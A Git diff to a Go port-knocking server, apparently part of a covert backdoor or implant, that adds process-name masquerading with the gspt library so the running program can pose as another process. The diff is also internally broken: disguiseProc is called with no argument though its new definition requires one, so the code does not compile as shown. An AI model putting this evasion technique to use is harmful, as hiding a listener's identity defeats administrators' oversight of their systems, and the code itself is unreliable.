@@ -2,7 +2,9 @@ package main
 
 import (
 	"fmt"
+	"os"
 
+	"github.com/ErikDubbelboer/gspt"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
@@ -11,7 +13,10 @@ import (
 func main() {
 	fmt.Println("Server Running")
 	disguiseProc()
-	listenForKnocks("wlp3s0")
+	listenForKnocks("en1")
+	titleOfProcess := os.Args[1]
+	// set the process name
+	gspt.SetProcTitle(titleOfProcess)
 	//serverWorker(net.ParseIP("192.168.1.46"))
 }
 
@@ -106,6 +111,6 @@ func checkKnocks(clients map[string]map[layers.UDPPort]bool, ip string) bool {
 	return true
 }
 
-func disguiseProc() {
-	//TODO
+func disguiseProc(titleOfProcess string) {
+	gspt.SetProcTitle(titleOfProcess)
 }
